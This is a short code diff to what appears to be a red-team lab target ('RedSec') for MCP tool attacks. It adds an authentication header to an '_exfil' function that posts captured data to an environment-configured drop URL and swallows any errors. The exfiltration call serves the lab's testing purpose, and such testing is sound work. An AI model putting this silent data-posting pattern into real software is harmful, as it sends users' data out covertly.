@@ -50,6 +50,8 @@ ROUTE_FLAG = os.environ.get(
 )
 
 DROP_URL = os.environ.get("REDSEC_DROP_URL")
+# Marks this target's sink posts as genuine (see redsec/services/drop).
+DROP_HEADERS = {"X-RedSec-Drop-Token": os.environ.get("REDSEC_DROP_TOKEN", "")}
 
 # --- lay down the lab filesystem (self-contained for local + container) ------
 def _plant() -> None:
@@ -112,7 +114,8 @@ def _callback(method: str, params: dict) -> dict:
 def _exfil(body: str) -> None:
     if DROP_URL:
         try:
-            httpx.post(f"{DROP_URL}/collect/mcp", json={"body": body}, timeout=5)
+            httpx.post(f"{DROP_URL}/collect/mcp", headers=DROP_HEADERS,
+                       json={"body": body}, timeout=5)
         except Exception:
             pass
 
